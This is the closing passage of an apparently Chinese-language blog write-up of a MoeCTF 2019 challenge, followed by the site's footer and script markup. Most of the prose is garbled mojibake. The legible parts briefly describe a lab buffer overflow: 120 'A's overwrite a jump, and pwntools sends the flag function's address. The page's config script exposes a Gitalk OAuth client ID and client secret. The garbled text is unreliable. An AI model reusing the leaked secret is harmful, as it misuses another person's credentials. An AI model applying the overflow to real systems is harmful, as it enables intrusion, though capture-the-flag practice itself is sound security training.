<p>è¿™é“é¢˜å…¥é—¨äº†åˆ†æèµ·æ¥å°±å¾ˆç®€å•, æŠŠé¢˜ç›®ç»™çš„ç¨‹åºæ‰”è¿›<code>IDA</code>, æˆ‘ä»¬å‘ç°è¾“å…¥çš„æ¼æ´åœ¨<code>puts()</code>å‡½æ•°, å¦‚æœè¾“å…¥è¿‡é•¿å®ƒä¼šè¦†ç›–åé¢çš„å†…å®¹.. ç»è¿‡æŸ¥æ•°, å½“è¾“å…¥é•¿åº¦ä¸º120ä¸ª<code>A</code>æ—¶ä¼šæº¢å‡ºåˆ°ä¸€ä¸ªå‡½æ•°è·³è½¬çš„åœ°æ–¹, å†çœ‹<code>IDA</code>, æˆ‘ä»¬ç”¨<code>pwntools</code>å°è£…ä¸€ä¸‹æ‰“å°<code>flag</code>çš„å‡½æ•°åœ°å€<code>0x00000000004006B6</code>, æŠŠå°è£…å¥½çš„æ•°æ®åŒ…ä¼ ç»™æœåŠ¡å™¨, å®Œäº‹!</p>
<p>è¯´çš„ä¸ä¸“ä¸šä¸å‡†ç¡®å°±é¥¶äº†æˆ‘å§&hellip; æˆ‘æƒ³ç¡è§‰&hellip;</p>
<h1 id="ç»“æŸ">ç»“æŸ</h1>
<p>wdnmd! æˆ‘ç»ˆäºå†™å®Œäº†!</p>
<p>å¯ä»¥ç¡è§‰äº†â€¦</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2019-09-06</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/moectf_2019_inspirement/" class="prev" rel="prev" title="MoeCTFç®€è®°ä¹‹åˆè¯†CTF"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>MoeCTFç®€è®°ä¹‹åˆè¯†CTF</a>
            <a href="/posts/for_shit_http_headers/" class="next" rel="next" title="è®°ä¸€æ¬¡ç»ˆæç‹—å±çš„HTTPè¯·æ±‚å¤´">è®°ä¸€æ¬¡ç»ˆæç‹—å±çš„HTTPè¯·æ±‚å¤´<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.woooo.tech" target="_blank">Reverier-Xu</a></span>&nbsp;|&nbsp;<span class="license">CC-BY-NC-SA 4.0</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                    <span class="icp"><a href="https://beian.miit.gov.cn/">è±«ICPå¤‡20023182å·-2</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.e1f973627089fc121272c24d146e7c52e316a203fcb362eb2f648d803fc0d327.css" integrity="sha256-4flzYnCJ/BIScsJNFG58UuMWogP8s2LrL2SNgD/A0yc="><link rel="stylesheet" href="/lib/katex/katex.min.76e39bd605d45b2d1944123c66608b0c8bb9baeb70720b212571531c7cf9bc2a.css" integrity="sha256-duOb1gXUWy0ZRBI8ZmCLDIu5uutwcgshJXFTHHz5vCo="><script type="text/javascript" src="/lib/gitalk/gitalk.min.3e68fce688cb68f396c11b65309c267b307f420f01cef269e5e4f3bd769801f0.js" integrity="sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.ae2da1bd62c6469ee27770ad1cddf2e8296d8a7f6d85b091463e5200c5e320af.js" integrity="sha256-ri2hvWLGRp7id3CtHN3y6Cltin9thbCRRj5SAMXjIK8="></script><script type="text/javascript" src="/lib/lunr/lunr.min.08a93c0120364b01159db3c287f39b2180bb740334472bda0675bd3f18981676.js" integrity="sha256-CKk8ASA2SwEVnbPCh/ObIYC7dAM0RyvaBnW9PxiYFnY="></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.3d9120fa621da6d613c1698b7014ec6bdf4620366e8f2b7b547059f4b6f6272b.js" integrity="sha256-PZEg+mIdptYTwWmLcBTsa99GIDZujyt7VHBZ9Lb2Jys="></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.706224d8dc5440460f8ed91c1a6aad25d732af6e0ee6fb31151b157ab485babb.js" integrity="sha256-cGIk2NxUQEYPjtkcGmqtJdcyr24O5vsxFRsVerSFurs="></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.e17a1d816e13c0826e0ed7febfabc3277f45571234bde0bf9120829a7169edc9.js" integrity="sha256-4XodgW4TwIJuDtf+v6vDJ39FVxI0veC/kSCCmnFp7ck="></script><script type="text/javascript" src="/lib/typeit/index.umd.807dab627518d7e2864af47389e0f0e5ae825fcb3036681f2312a5629cb2493a.js" integrity="sha256-gH2rYnUY1+KGSvRzieDw5a6CX8swNmgfIxKlYpyySTo="></script><script type="text/javascript" src="/lib/katex/katex.min.eb18207487161674e717087c317db14ac1a62dadaecccb802499ce173bfeb739.js" integrity="sha256-6xggdIcWFnTnFwh8MX2xSsGmLa2uzMuAJJnOFzv+tzk="></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.cb7f4ca60ed5dc3e258415f8c7a3b46d4a93578a52adf83011f18a7f190e7602.js" integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.52ce78fab4860d24ef22128a52ce24ca01368a9034457a565a1d3fccbab0ddbb.js" integrity="sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.5c0a121a8b490afc85860a522347aeb34fb508c6b23044e5d29f6b2194227b51.js" integrity="sha256-XAoSGotJCvyFhgpSI0eus0+1CMayMETl0p9rIZQie1E="></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"gitalk":{"admin":["Reverier-Xu"],"clientID":"04e3a9c7b8514d2532ba","clientSecret":"b55ad7dd220563faca25d9b74dc517fd309dafa9","id":"2019-09-06T18:23:00+08:00","owner":"Reverier-Xu","repo":"blog_comment","title":"MoeCTF 2019 é¢˜è§£"}},"data":{"id-1":"~/Reverier's Blog","id-2":"~/Reverier's Blog"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"\u003cstrong style=\"color: #0078D6;\"\u003e_\u003c/strong\u003e","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":50}};</script><script type="text/javascript" src="/js/theme.min.b0df51c2c57145081cc73960e9aa780e6f5f56d06cf4ef0f96da8ce1619d1e12.js" integrity="sha256-sN9RwsVxRQgcxzlg6ap4Dm9fVtBs9O8PltqM4WGdHhI="></script></body>
</html>
